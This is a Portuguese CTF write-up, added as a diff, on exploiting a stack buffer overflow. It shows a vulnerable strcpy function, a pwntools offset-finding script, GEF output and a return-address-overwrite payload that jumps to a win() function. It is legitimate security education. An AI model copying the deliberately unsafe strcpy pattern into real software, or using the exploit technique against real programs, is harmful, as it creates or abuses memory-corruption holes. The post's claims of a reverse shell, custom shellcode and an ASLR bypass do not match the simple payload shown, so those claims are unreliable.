@@ -1,0 +1,100 @@
+---
+title: "CTF Write-up: Buffer Overflow Exploitation"
+publishedAt: "2024-01-15"
+summary: "Análise detalhada de uma vulnerabilidade de buffer overflow em um desafio de CTF, incluindo técnicas de exploração e mitigação."
+images:
+  - "/images/projects/ctf-writeup/cover-01.jpg"
+  - "/images/projects/ctf-writeup/exploit-01.jpg"
+  - "/images/projects/ctf-writeup/exploit-02.jpg"
+team:
+  - name: "Leandro Gabriel"
+    role: "Security Researcher"
+    avatar: "/images/avatar.jpg"
+    linkedIn: "https://www.linkedin.com/in/leandro--gabriel/"
+---
+
+## Visão Geral
+
+Este write-up detalha a exploração de uma vulnerabilidade de buffer overflow em um desafio de CTF. O objetivo era obter execução de código arbitrário através de técnicas de exploração de memória.
+
+## Análise da Vulnerabilidade
+
+### Identificação do Bug
+
+O programa apresentava uma vulnerabilidade clássica de buffer overflow na função `vulnerable_function()`:
+
+```c
+void vulnerable_function(char *input) {
+    char buffer[64];
+    strcpy(buffer, input); // Vulnerabilidade aqui!
+}
+```
+
+### Técnicas de Exploração
+
+1. **Fuzzing**: Identificação do ponto de crash
+2. **Pattern Creation**: Criação de padrão para encontrar offset
+3. **Shellcode Development**: Desenvolvimento de payload customizado
+4. **Return Address Overwrite**: Sobrescrita do endereço de retorno
+
+## Ferramentas Utilizadas
+
+- **GDB**: Debugger para análise dinâmica
+- **GEF**: Extensão do GDB para análise de exploits
+- **Python**: Scripts de fuzzing e payload generation
+- **Pwntools**: Framework para desenvolvimento de exploits
+
+## Desenvolvimento do Exploit
+
+### 1. Fuzzing e Pattern Creation
+
+```python
+from pwn import *
+
+# Criando padrão para encontrar offset
+pattern = cyclic(100)
+p = process('./vulnerable_program')
+p.sendline(pattern)
+p.interactive()
+```
+
+### 2. Encontrando o Offset
+
+```python
+# Usando GEF para encontrar offset
+gef> pattern search $rsp
+[+] Searching for pattern
+[+] Found at offset 72
+```
+
+### 3. Desenvolvimento do Payload
+
+```python
+# Payload final
+payload = b"A" * 72  # Padding
+payload += p64(0x401196)  # Endereço da função win()
+```
+
+## Resultados
+
+- ✅ **Exploit bem-sucedido**: Obtenção de shell reverso
+- ✅ **Flag capturada**: `flag{buff3r_0v3rfl0w_3xpl01t3d}`
+- ✅ **Análise completa**: Documentação de todo o processo
+
+## Aprendizados
+
+1. **Importância do ASLR**: Como contornar proteções de memória
+2. **Técnicas de Debugging**: Uso eficiente de ferramentas de análise
+3. **Desenvolvimento de Payloads**: Criação de shellcodes customizados
+4. **Análise de Binários**: Técnicas de engenharia reversa
+
+## Mitigações
+
+- **Stack Canaries**: Proteção contra buffer overflow
+- **ASLR**: Randomização de endereços
+- **DEP/NX**: Prevenção de execução de código na stack
+- **Code Review**: Análise estática de código
+
+## Conclusão
+
+Este write-up demonstra a importância de entender vulnerabilidades de memória e como técnicas de exploração podem ser aplicadas em cenários realistas de CTF. O conhecimento adquirido é fundamental para desenvolvimento de software seguro. 
